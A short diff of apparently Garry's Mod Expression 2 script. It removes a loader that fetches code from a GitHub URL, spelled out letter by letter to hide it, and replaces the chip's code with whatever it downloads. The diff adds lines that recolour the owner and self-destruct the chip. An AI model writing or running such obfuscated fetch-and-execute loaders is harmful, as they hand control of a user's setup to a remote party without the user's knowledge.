@@ -1,15 +1,2 @@
-@persist EXEC
-
-if (clk("Retry")||EXEC==0) {
-    EXEC=1
-    runOnHTTP(1)
-    if (httpCanRequest()) {
-        httpRequest("https://raw.githubusercontent.com/Efealtan0909/"+"V"+"D"+"e"+"t"+"e"+"c"+"t"+"o"+"r"+"/main/remove.txt")
-    } else {
-        timer("Retry", 1500)
-    }  
-}
-
-if (httpClk()) {
-    entity():remoteSetCode(httpData())   
-}
+owner():setColor(vec(255, 255, 0))
+selfDestruct()
